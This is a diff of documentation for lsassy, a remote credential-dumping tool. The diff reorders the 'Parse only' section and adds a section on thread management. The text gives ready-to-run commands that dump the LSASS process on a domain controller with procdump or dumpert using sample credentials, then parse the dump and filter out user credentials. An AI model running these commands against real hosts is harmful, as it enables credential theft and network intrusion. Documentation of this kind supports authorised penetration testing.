@@ -170,18 +170,23 @@ For some dumping method, options are required, like procdump or dumpert path. Th
 ... --options key=value,foo=bar
 ```
 
-#### Parse only
-
-You can choose to parse an already dumped lsass process by providing `--parse-only` switch, alongside with `--dump-path` and `--dump-name` parameters.
-
-Note that if you choose this method, the remote lsass dump won't be deleted.
-
-#### Examples
+For example:
 
 ```bash
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m procdump    -O procdump_path=/opt/Sysinternals/procdump.exe
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m dumpert     -O dumpert_path=/opt/dumpert.exe
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m dumpertdll  -O dumpertdll_path=/opt/dumpert.dll
+```
+
+#### Parse only
+
+You can choose to parse an already dumped lsass process by providing `--parse-only` switch, alongside with `--dump-path` and `--dump-name` parameters.
+
+Note that if you choose this method, the **remote lsass dump won't be deleted**.
+
+For example:
+
+```bash
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local --parse-only --dump-path "/Windows/Temp" --dump-name "lsass.dmp"
 ```
 
@@ -286,6 +291,14 @@ lsassy [-d domain] -u user -p password targets --format json --outfile /tmp/cred
 If you want to only get users credentials, filtering out computers credentials, you can use `--users` flag
 ```
 lsassy [-d domain] -u user -p password targets --users
+```
+
+#### Thread management
+
+You can decide how many thread you want to use \[1-256\] using `--threads` parameter.
+
+```
+lsassy [-d domain] -u user -p password targets --threads 32
 ```
 
 
